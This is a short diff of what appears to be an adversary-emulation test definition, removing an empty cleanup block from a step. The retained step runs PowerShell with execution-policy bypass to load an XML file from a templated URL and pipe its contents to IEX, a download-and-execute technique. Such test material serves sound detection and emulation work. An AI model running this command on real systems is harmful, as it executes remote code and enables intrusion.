@@ -24,6 +24,3 @@ steps:
       inline: |
         "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('{{.Args.url}}');$Xml.command.a.execute | IEX"
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
